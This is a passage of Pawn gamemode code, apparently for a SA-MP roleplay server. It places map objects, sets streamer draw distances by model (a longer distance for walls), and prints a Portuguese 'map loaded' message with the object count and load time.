	CreateDynamicObject(19447, 1207.85828, -1463.68909, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1210.18994, -1476.09131, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1210.89282, -1485.23779, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.19507, -1494.35071, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.12878, -1503.51025, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1214.26367, -1509.25195, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19447, 1211.00708, -1510.35559, 12.46010,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19456, 1588.38806, -1638.27954, 17.18561,   0.00000, 0.00000, -89.88004);	
	
	new maxobjects = GetMaxObjects();
	
	for (new i = 1; i < maxobjects; i++)
	{
		new modelid = Streamer_GetIntData(0, i, E_STREAMER_MODEL_ID);
		
		if(modelid == 11696) // muralhas
		{
		    Streamer_SetFloatData(0, i, E_STREAMER_STREAM_DISTANCE, 350.0);
		}
		else
		{
			Streamer_SetFloatData(0, i, E_STREAMER_STREAM_DISTANCE, 230.0);
		}
	}
	
	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 980);

    tick2 = GetTickCount();
	printf("\n [PC:RP] Mapa Carregado [%d objetos carregados] (%d ms)\n", maxobjects, tick2-tick1);

	return 1;
}

